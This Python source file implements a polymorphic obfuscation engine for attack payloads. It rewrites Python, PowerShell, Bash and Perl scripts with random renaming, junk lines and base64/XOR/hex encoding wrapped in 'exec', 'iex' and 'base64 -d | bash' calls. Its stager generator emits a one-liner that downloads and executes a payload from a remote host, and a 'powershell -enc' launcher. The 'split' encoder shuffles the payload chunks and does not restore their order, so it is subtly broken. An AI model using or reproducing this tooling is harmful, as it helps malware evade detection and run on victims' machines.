import random
import string
import base64
import os
from hashlib import md5


class PolymorphicEngine:
    def __init__(self, seed=None):
        if seed is None:
            seed = random.randint(0, 2**32)
        self.seed = seed
        self.rand = random.Random(seed)

    def mutate_script(self, code, lang="python"):
        if lang == "python":
            return self._mutate_python(code)
        elif lang == "powershell":
            return self._mutate_powershell(code)
        elif lang == "bash":
            return self._mutate_bash(code)
        elif lang == "perl":
            return self._mutate_perl(code)
        return code

    def _random_name(self, length=None):
        if length is None:
            length = self.rand.randint(6, 14)
        first = self.rand.choice(string.ascii_letters)
        rest = "".join(self.rand.choices(string.ascii_letters + string.digits, k=length - 1))
        return first + rest

    def _junk_line(self, lang="python"):
        junkers = {
            "python": [
                f"{self._random_name()} = {self.rand.randint(0, 999)}",
                f"{self._random_name()} = '{self._random_name()}'",
                f"# {self._random_name()}",
                f"if {self.rand.randint(0,1)} == {self.rand.randint(0,1)}: pass",
            ],
            "powershell": [
                f"${self._random_name()} = {self.rand.randint(0, 999)}",
                f"${self._random_name()} = '{self._random_name()}'",
                f"# {self._random_name()}",
                f"if ({self.rand.randint(0,1)} -eq {self.rand.randint(0,1)}) {{ }}",
            ],
            "bash": [
                f"{self._random_name()}={self.rand.randint(0, 999)}",
                f"# {self._random_name()}",
                f": ${{{self._random_name()}:=dummy}}",
            ],
            "perl": [
                f"my ${self._random_name()} = {self.rand.randint(0, 999)};",
                f"# {self._random_name()}",
            ],
        }
        return self.rand.choice(junkers.get(lang, junkers["python"]))

    def _mutate_python(self, code):
        lines = code.split("\n")
        result = []
        injection_points = [i for i, line in enumerate(lines) if line.strip() and not line.strip().startswith("#")]
        if injection_points and self.rand.random() < 0.7:
            insert_at = self.rand.choice(injection_points)
            indent = len(lines[insert_at]) - len(lines[insert_at].lstrip())
            junk = " " * indent + self._junk_line("python")
            lines.insert(insert_at, junk)

        module_names = set()
        for line in lines:
            for m in re.finditer(r'(?:^|;)\s*import\s+(\w+)', line):
                module_names.add(m.group(1))
            for m in re.finditer(r'(?:^|;)\s*from\s+(\w+)', line):
                module_names.add(m.group(1))

        reserved = ("if", "else", "elif", "for", "while", "def", "class",
                     "return", "import", "from", "in", "not", "and",
                     "or", "is", "None", "True", "False", "try",
                     "except", "finally", "raise", "with", "as",
                     "pass", "break", "continue", "lambda", "yield",
                     "self", "print", "len", "range", "str", "int",
                     "list", "dict", "set", "tuple", "open", "type",
                     "Exception", "BaseException", "object", "bytes")
        var_map = {}
        new_lines = []
        for line in lines:
            for m in re.finditer(r'(?<!\w)([a-zA-Z_]\w*)(?!\w)', line):
                old_var = m.group(1)
                if old_var in reserved or old_var in module_names:
                    continue
                if old_var not in var_map:
                    var_map[old_var] = self._random_name()
            for old_var, new_var in var_map.items():
                line = re.sub(r'(?<!\w)' + re.escape(old_var) + r'(?!\w)', new_var, line)
            new_lines.append(line)

        if self.rand.random() < 0.4:
            encoded_lines = []
            for line in new_lines:
                if line.strip() and not line.strip().startswith("#") and self.rand.random() < 0.3:
                    var_name = self._random_name()
                    b64 = base64.b64encode(line.encode()).decode()
                    encoded_lines.append(f"{var_name} = __import__('base64').b64decode('{b64}').decode()")
                    encoded_lines.append(f"exec({var_name})")
                else:
                    encoded_lines.append(line)
            new_lines = encoded_lines

        return "\n".join(new_lines)

    def _mutate_powershell(self, code):
        lines = code.split("\n")
        if self.rand.random() < 0.6:
            insert_at = self.rand.randint(0, max(0, len(lines) - 1))
            junk = self._junk_line("powershell")
            lines.insert(insert_at, junk)

        var_map = {}
        for i, line in enumerate(lines):
            for old_var in re.findall(r'\$(\w+)', line):
                if old_var not in var_map:
                    var_map[old_var] = self._random_name()
                lines[i] = lines[i].replace(f"${old_var}", f"${var_map[old_var]}")

        if self.rand.random() < 0.5:
            b64_lines = []
            for line in lines:
                if line.strip() and not line.strip().startswith("#") and self.rand.random() < 0.3:
                    encoded = base64.b64encode(line.encode("utf-16le")).decode()
                    b64_lines.append(f"[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('{encoded}')) | iex")
                else:
                    b64_lines.append(line)
            lines = b64_lines

        return "\n".join(lines)

    def _mutate_bash(self, code):
        lines = code.split("\n")
        if self.rand.random() < 0.5:
            insert_at = self.rand.randint(0, max(0, len(lines) - 1))
            junk = self._junk_line("bash")
            lines.insert(insert_at, junk)

        var_map = {}
        for i, line in enumerate(lines):
            for old_var in re.findall(r'\b([a-zA-Z_]\w*)=(?!=)', line):
                if old_var not in var_map:
                    var_map[old_var] = self._random_name()
                lines[i] = lines[i].replace(f"{old_var}=", f"{var_map[old_var]}=")

        if self.rand.random() < 0.4:
            encoded = base64.b64encode("\n".join(lines).encode()).decode()
            return f"echo '{encoded}' | base64 -d | bash"

        return "\n".join(lines)

    def _mutate_perl(self, code):
        lines = code.split("\n")
        if self.rand.random() < 0.5:
            insert_at = self.rand.randint(0, max(0, len(lines) - 1))
            junk = self._junk_line("perl")
            lines.insert(insert_at, junk)
        return "\n".join(lines)

    def encode_layer(self, payload, method="auto"):
        if method == "auto":
            methods = ["base64", "xor", "hex", "reverse", "split"]
            method = self.rand.choice(methods)

        if method == "base64":
            encoded = base64.b64encode(payload.encode() if isinstance(payload, str) else payload).decode()
            return f"__import__('base64').b64decode('{encoded}').decode()"
        elif method == "xor":
            key = self.rand.randint(1, 255)
            data = payload.encode() if isinstance(payload, str) else payload
            xored = bytes([b ^ key for b in data])
            return f"bytes([b ^ {key} for b in {list(xored)}]).decode()"
        elif method == "hex":
            hex_str = payload.encode().hex() if isinstance(payload, str) else payload.hex()
            return f"bytes.fromhex('{hex_str}').decode()"
        elif method == "reverse":
            return f"'{payload[::-1]}'[::-1]"
        elif method == "split":
            parts = [payload[i:i+10] for i in range(0, len(payload), 10)]
            self.rand.shuffle(parts) if len(parts) > 1 else None
            indices = [i for i in range(len(payload))]
            self.rand.shuffle(indices)
            return f"''.join([{','.join(repr(p) for p in parts)}])"
        return payload

    def full_mutate(self, payload, lang="python", encoding_rounds=1):
        mutated = self.mutate_script(payload, lang)
        for _ in range(encoding_rounds):
            if self.rand.random() < 0.5:
                encoded = self.encode_layer(mutated, "auto")
                stager = self._random_name()
                mutated = f"{stager} = {encoded}\nexec({stager})"
        return mutated

    def generate_stager(self, payload, technique="download"):
        if technique == "download":
            url = f"http://{self._random_name()}.{self._random_name()}/payload"
            return f"import urllib.request; exec(urllib.request.urlopen('{url}').read())"
        elif technique == "base64":
            b64 = base64.b64encode(payload.encode()).decode()
            return f"import base64; exec(base64.b64decode('{b64}'))"
        elif technique == "iex":
            b64 = base64.b64encode(payload.encode("utf-16le")).decode()
            return f"powershell -enc {b64}"
        return payload

    def checksum(self, code):
        return md5(code.encode() if isinstance(code, str) else code).hexdigest()


import re
